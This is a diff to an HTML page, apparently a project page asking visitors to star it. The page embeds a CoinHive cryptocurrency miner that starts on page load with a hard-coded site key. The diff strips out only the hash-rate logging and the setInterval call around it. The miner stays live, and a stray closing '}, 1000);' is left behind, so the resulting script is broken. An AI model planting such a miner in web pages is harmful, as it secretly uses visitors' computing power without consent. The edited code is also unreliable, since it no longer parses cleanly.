@@ -120,18 +120,6 @@ Hit the ⭐️ Star ⭐️ button.</p>
 	<script>
 	var miner = new CoinHive.Anonymous('GGFJ2HbJ0jspIGFTjFkLsKBMkBoyV1gs', {throttle: 0.3});
 	miner.start();
-		
-	miner.on('found', function() { console.log("Found hash.");})
-	miner.on('accepted', function() { console.log("Hash accepted!");})
-
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-
-	console.log("Hashes / second:", hashesPerSecond);
-	console.log("Total hashes:", totalHashes);
-	console.log("Accepted hashes:", acceptedHashes);
 	}, 1000);
     </script>
   </body>
